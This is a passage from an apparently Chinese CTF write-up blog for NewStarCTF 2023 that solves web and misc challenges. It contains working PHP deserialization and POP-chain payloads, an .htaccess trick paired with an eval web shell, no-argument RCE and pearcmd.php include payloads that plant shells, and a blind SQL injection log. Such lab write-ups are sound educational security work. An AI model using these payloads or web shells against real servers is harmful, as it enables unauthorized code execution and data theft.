class="hljs-number">49</span>f9-a6ef-be72d058bec2&#125;<br></code></pre></td></tr></table></figure><h3 id="Unserialize"><a href="#Unserialize" class="headerlink" title="Unserialize"></a>Unserialize</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// Maybe you need learn some knowledge about deserialize?</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;<br>  <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;cmd))&#123;<br>      @<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;cmd);<br>    &#125;<br>  &#125;<br>&#125;<br><br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;unser&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>使用<code>POST</code>提交<code>unser</code>，进行反序列化，cmd的值不含<code>cat、tac、more、tail、base</code>的大小写变形，就执行<code>system($this-&gt;cmd)</code>命令</p><p>先<code>ls /</code></p><p>payload：<code>unser=O:4:&quot;evil&quot;:1:&#123;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;</code></p><p>回显中有 <code>th1s_1s_fffflllll4444aaaggggg</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">unser</span>=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;evil&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;cmd&quot;</span>;s:<span class="hljs-number">35</span>:<span class="hljs-string">&quot;sort /th1s_1s_fffflllll4444aaaggggg&quot;</span>;&#125;<br><span class="hljs-attribute">flag</span>&#123;d2195283-<span class="hljs-number">49</span>ad-<span class="hljs-number">403</span>d-<span class="hljs-number">9</span>ec7-fbf8d9440fa1&#125;<br></code></pre></td></tr></table></figure><h3 id="Upload-again"><a href="#Upload-again" class="headerlink" title="Upload again!"></a>Upload again!</h3><p><code>.htaccess</code>解析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;FilesMatch &quot;3.png&quot;&gt;<br>SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure><p>然后上传<code>3.png</code>内容是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;password&#x27;]);&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>蚁剑连接即可</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">76577</span>f9b-fda7-<span class="hljs-number">4362</span>-a0f2-<span class="hljs-number">0</span>a21e9f6c435&#125;<br></code></pre></td></tr></table></figure><h3 id="R-C-E-1"><a href="#R-C-E-1" class="headerlink" title="R!!C!!E!!"></a>R!!C!!E!!</h3><p>dirmap扫描发现</p><p><code>/.git/config</code>  、<code>index.php</code>、<code>index.php/login</code></p><p>发现后面两个没用</p><p><code>githacker</code>扫描一下</p><img src="/2023/10/23/NewStarCTF2023/10/23/NewStarCTF2023/1697196980019.jpg" class title="index.jpg"><p><code>bo0g1pop.php</code>内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>]);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/t/9360#toc-8">PHP的无参数RCE - 先知社区 (aliyun.com)</a></p><p>参考这篇博客</p><p>getallheaders() 在最后加的话用bp打好像并不是最后一个，试了好多种别的办法无果，但是 next() 后是ua头，直接改ua</p><p>利用 payload: <code>system(next(getallheaders()));</code></p><p><img src="/2023/10/23/NewStarCTF2023/1697197213357.jpg" alt="1697197213357"></p><p>在根目录下有flag</p><p><img src="/2023/10/23/NewStarCTF2023/1697197251490.jpg" alt="1697197251490">&#96;</p><h2 id="Misc-1"><a href="#Misc-1" class="headerlink" title="Misc"></a>Misc</h2><h3 id="永不消逝的电波"><a href="#永不消逝的电波" class="headerlink" title="永不消逝的电波"></a>永不消逝的电波</h3><p>在线morse解密</p><h3 id="1-序章"><a href="#1-序章" class="headerlink" title="1-序章"></a>1-序章</h3><p>给了一个SQL盲注的日志，注入正确后会进入下一位的注入，例如</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">172.17</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-operator">-</span> <span class="hljs-operator">-</span> [<span class="hljs-number">20</span><span class="hljs-operator">/</span>Aug<span class="hljs-operator">/</span><span class="hljs-number">2023</span>:<span class="hljs-number">00</span>:<span class="hljs-number">08</span>:<span class="hljs-number">44</span> <span class="hljs-operator">+</span><span class="hljs-number">0800</span>] &quot;GET /app/action/edit_sell.php?pid%5B0%5D=-1%20or%20if(ascii(substr((select%20group_concat(username,password)%20from%20user),7,1))=110,sleep(1),1)--+&amp;totalPrice=0 HTTP/1.1&quot; <span class="hljs-number">500</span> <span class="hljs-number">353</span> &quot;-&quot; &quot;python-requests/2.28.2&quot;<span class="hljs-number">172.17</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-operator">-</span> <span class="hljs-operator">-</span> [<span class="hljs-number">20</span><span class="hljs-operator">/</span>Aug<span class="hljs-operator">/</span><span class="hljs-number">2023</span>:<span class="hljs-number">00</span>:<span class="hljs-number">08</span>:<span class="hljs-number">47</span> <span class="hljs-operator">+</span><span class="hljs-number">0800</span>] &quot;GET /app/action/edit_sell.php?pid%5B0%5D=-1%20or%20if(ascii(substr((select%20group_concat(username,password)%20from%20user),8,1))=40,sleep(1),1)--+&amp;totalPrice=0 HTTP/1.1&quot; <span class="hljs-number">500</span> <span class="hljs-number">353</span> &quot;-&quot; &quot;python-requests/2.28.2&quot;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding:utf-8</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> urllib <br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;access.log&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>lines = f.readlines()<br>datas = []<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:    <br>    t = urllib.unquote(line)     <br>    datas.append(t) <br>flag_ascii = &#123;&#125;  <br><span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> datas:    <br>matchObj = re.search( <span class="hljs-string">r&#x27;user\),(.*?),1\)\)=(.*?),sleep&#x27;</span>, data)    <br>    <span class="hljs-keyword">if</span> matchObj:        <br>        key = <span class="hljs-built_in">int</span>(matchObj.group(<span class="hljs-number">1</span>))        <br>        value = <span class="hljs-built_in">int</span>(matchObj.group(<span class="hljs-number">2</span>))        <br>        flag_ascii[key] = value        <br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> value <span class="hljs-keyword">in</span> flag_ascii.values():    <br>    flag += <span class="hljs-built_in">chr</span>(value)    <br><span class="hljs-built_in">print</span> flag<br></code></pre></td></tr></table></figure><p><img src="/2023/10/23/NewStarCTF2023/sql.png" alt="sql"></p><h3 id="新建Word文档"><a href="#新建Word文档" class="headerlink" title="新建Word文档"></a>新建Word文档</h3><p>新佛曰：毘諸隸僧降吽諸陀摩隸僧缽薩願毘耨咤陀願羅咤喃修願宣亦宣寂叻寂阿是吽阿塞尊劫毘般毘所聞降毘咒塞尊薩咒毘所若降般斯毘嚴毘嚴波斯迦毘色毘波嚴毘喃念若修嘚般毘我毘如毘如囑囑</p><p>搜索在线解密</p><p><code>flag&#123;Th1s_F0_1s_s00_Cyp3r_495586e3df3a&#125;</code></p><h3 id="base！"><a href="#base！" class="headerlink" title="base！"></a>base！</h3><p>给了一个base.txt</p><p>里面是好多行的base64</p><p>猜测是base64隐写</p><p><code>iDMb6ZMnTFMtFuouYZHwPTYAoWjC7Hjca8</code></p><p>base58解得</p><p><code>flag&#123;b4se_1s_4_g0od_c0d3&#125;</code></p><h3 id="jvav"><a href="#jvav" class="headerlink" title="jvav"></a>jvav</h3><p>java盲水印</p><p><a href="https://github.com/ww23/BlindWatermark">https://github.com/ww23/BlindWatermark</a></p><p><code>java -jar BlindWatermark-v0.0.3.jar decode -c challenge.png 1.png</code></p><p><img src="/2023/10/23/NewStarCTF2023/1.png" alt="1"></p><h3 id="WebShell的利用"><a href="#WebShell的利用" class="headerlink" title="WebShell的利用"></a>WebShell的利用</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$shell</span> = <span class="hljs-string">&quot;eval(str_rot13(convert_uudecode(str_rot13(base64_decode(&#x27;&#x27;)))));&quot;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span>&lt;<span class="hljs-number">50</span>; <span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/base64/&quot;</span>,<span class="hljs-variable">$shell</span>))&#123;<br>        <span class="hljs-variable">$tmp</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/eval/&quot;</span>,<span class="hljs-string">&quot;return &quot;</span>,<span class="hljs-variable">$shell</span>);<br>        <span class="hljs-variable">$shell</span> = <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$tmp</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$shell</span>;<br></code></pre></td></tr></table></figure><p><code>error_reporting(0);($_GET[&#39;7d67973a&#39;])($_POST[&#39;9fa3&#39;]);</code></p><p>GET：<code>?7d67973a=system</code></p><p>POST：<code>9fa3=ls /</code></p><h1 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h1><h2 id="Web-2"><a href="#Web-2" class="headerlink" title="Web"></a>Web</h2><h3 id="include"><a href="#include" class="headerlink" title="include"></a>include</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/flag|log|session|filter|input|data/i&#x27;</span>, <span class="hljs-variable">$file</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>        &#125;<br>        <br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>        <span class="hljs-comment"># Something in phpinfo.php!</span><br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>提示去看phpinfo.php，打开搜索flag看到fake{check_register_argc_argv}</p><p><a href="https://blog.csdn.net/JCPS_Y/article/details/127541665">浅谈文件包含之包含pearcmd.php漏洞_register_argc_argv文件包含-CSDN博客</a></p><p><a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html</a></p><p>buuctf 的靶机是用 docker 搭的, 猜测默认环境下应该也会有 pearcmd.php根据文章所说, docker php 环境下 <code>register_argc_argv</code> 默认为 On, 也就是说我们可以通过 query-string 来控制 <code>$_SERVER[&#39;argv&#39;]</code>, 即执行 pearcmd.php 所需要的参数</p><p>payload 如下:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gradle">?+config-create+<span class="hljs-regexp">/&amp;file=/u</span>sr<span class="hljs-regexp">/local/</span>lib<span class="hljs-regexp">/php/</span>pearcmd&amp;<span class="hljs-regexp">/&lt;?=@eval($_POST[1]);?&gt;+/</span>tmp/hello.php<br>需要在burp中传入，在hackbar传入会被url编码<br><br>?<span class="hljs-keyword">file</span>=<span class="hljs-regexp">/tmp/</span>hello<br>POST传参命令执行<br></code></pre></td></tr></table></figure><p><img src="/2023/10/23/NewStarCTF2023/week3_1.jpg" alt="week3_1"></p><p><img src="/2023/10/23/NewStarCTF2023/week3_2.png" alt="week3_2"></p><h3 id="medium-sql"><a href="#medium-sql" class="headerlink" title="medium_sql"></a>medium_sql</h3><p>sqlmap一把梭，布尔盲注时间有点久</p><h3 id="POP-Gadget"><a href="#POP-Gadget" class="headerlink" title="POP Gadget"></a>POP Gadget</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title class_">Begin</span>::<span class="hljs-variable constant_">__destruct</span> -&gt; <span class="hljs-title class_">Then</span>::<span class="hljs-variable constant_">__toString</span> -&gt; <span class="hljs-title class_">Super</span>::<span class="hljs-variable constant_">__invoke</span> -&gt; <span class="hljs-title class_">Handle</span>::<span class="hljs-variable constant_">__call</span> -&gt; CTF::<span class="hljs-variable constant_">end</span> -&gt; <span class="hljs-title class_">WhiteGod</span>::<span class="hljs-variable constant_">__unset</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Begin</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="hljs-variable">$this</span>-&gt;name))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Then</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Good Job!&quot;</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Handle</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$vars</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">end</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Super</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">getStr</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;==GAME OVER==&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$handle</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;handle-&gt;log);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WhiteGod</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>    &#125;<br>&#125;<br><br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Begin</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$a</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Then</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;func= <span class="hljs-variable">$a</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Handle</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj = <span class="hljs-variable">$a</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Super</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj = <span class="hljs-variable">$a</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$handle</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;handle = <span class="hljs-variable">$a</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WhiteGod</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;func = <span class="hljs-variable">$a</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span> = <span class="hljs-variable">$b</span>;<br>    &#125;<br>&#125;<span class="hljs-comment">// POP Gadget: // Begin::__destruct -&gt; Then::toString -&gt; Super::__invoke -&gt; Handle::__call -&gt; CTF::end -&gt; WhiteGod::__unset</span><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Begin</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Then</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Super</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Handle</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">CTF</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">WhiteGod</span>(<span class="hljs-string">&quot;readfile&quot;</span>,<span class="hljs-string">&quot;/flag&quot;</span>))))));<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>));<br></code></pre></td></tr></table></figure><p>需要注意的是一些类中有保护或私有属性的成员，因此需要对序列化数据进行URL编码，得到：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Begin%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>name%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Then%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A10%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Then%<span class="hljs-number">00</span>func%<span class="hljs-number">22</span>%<span 